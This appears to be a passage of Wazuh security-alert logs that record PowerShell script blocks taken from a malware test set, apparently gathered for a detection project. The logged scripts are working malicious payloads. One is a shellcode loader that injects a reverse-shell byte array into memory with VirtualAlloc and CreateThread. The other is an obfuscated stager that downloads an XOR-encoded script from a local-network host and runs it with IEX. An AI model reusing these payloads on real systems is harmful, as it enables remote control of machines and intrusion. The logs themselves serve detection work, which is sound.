xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$SwH=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($SwH.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$SwH,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: c5fb63e1-174a-4b13-9ff1-0cfd79f614c0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3394.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$ox6F = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ox6F -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$SwH=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($SwH.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$SwH,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"c5fb63e1-174a-4b13-9ff1-0cfd79f614c0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3394.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:14.600+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":14,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304474.3767446","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:35.0114821Z","eventRecordID":"145641","processID":"2148","threadID":"1928","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wc=NEW-ObJEcT SysTeM.Net.WEBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadERS.AdD('User-Agent',$u);$wC.PrOxy = [SystEm.Net.WeBRequEst]::DEfaultWeBProXy;$Wc.PrOxy.CREdEnTIaLs = [SyStem.NEt.CrEDenTiALCacHe]::DefauLTNetwORkCReDENtIalS;$K='pEv=HxFmTo.dOqVZz~kaiC{-+;S)U1X3';$I=0;[char[]]$b=([ChAR[]]($WC.DoWNLoaDSTRIng(\"http://192.168.1.3:8080/index.asp\")))|%{$_-bXor$K[$I++%$K.Length]};IEX ($b-jOIn'')\r\n\r\nScriptBlock ID: ef01abf7-ee88-4c16-bf3d-7191e92f5a3f\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3420.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wc=NEW-ObJEcT SysTeM.Net.WEBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadERS.AdD('User-Agent',$u);$wC.PrOxy = [SystEm.Net.WeBRequEst]::DEfaultWeBProXy;$Wc.PrOxy.CREdEnTIaLs = [SyStem.NEt.CrEDenTiALCacHe]::DefauLTNetwORkCReDENtIalS;$K='pEv=HxFmTo.dOqVZz~kaiC{-+;S)U1X3';$I=0;[char[]]$b=([ChAR[]]($WC.DoWNLoaDSTRIng(\\\"http://192.168.1.3:8080/index.asp\\\")))|%{$_-bXor$K[$I++%$K.Length]};IEX ($b-jOIn'')","scriptBlockId":"ef01abf7-ee88-4c16-bf3d-7191e92f5a3f","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3420.ps1"}}},"location":"EventChannel"}
